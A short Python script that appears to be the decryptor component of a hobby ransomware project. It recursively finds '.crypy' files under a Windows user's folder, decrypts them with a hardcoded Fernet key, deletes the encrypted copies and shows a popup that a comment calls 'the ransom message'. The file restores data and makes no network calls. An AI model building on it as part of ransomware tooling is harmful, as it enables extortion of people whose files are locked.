#!/usr/bin/python3.8
import getpass
import glob
import os
import tkinter
from tkinter import messagebox

from cryptography.fernet import Fernet


def decrypt():
    # Decrypt the already encrypted files
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
    usr = getpass.getuser()
    if True:
        print("Getting files to decrypt. This may take a few minutes. Be patient.")
        # Get files to decrypt
        # Get documents in current user to decrypt
        path = 'C:/Users/' + usr
        for f_name in glob.glob(path + '/**/*.crypy', recursive=True):
            k = key
            f = Fernet(k)
            print("Decrypting files")
            try:
                with open(f_name, "rb") as file:
                    encrypted_data = file.read()

                decrypted_data = f.decrypt(encrypted_data)
                with open(f_name[:-6], "wb") as file:
                    file.write(decrypted_data)
                    os.remove(f_name)
            except Exception as e:
                print(e)
                pass
            print("Done. Thank you for waiting")


def message():
    # this function prompts a window containing the ransom message
    window = tkinter.Tk()
    window.wm_withdraw()
    header = "HELLO... YOUR FILES HAVE BEEN DECRYPTED"
    body = "THANK YOU"
    messagebox.showinfo(title=header, message=body)


def main():
    decrypt()
    message()


if __name__ == '__main__':
    main()
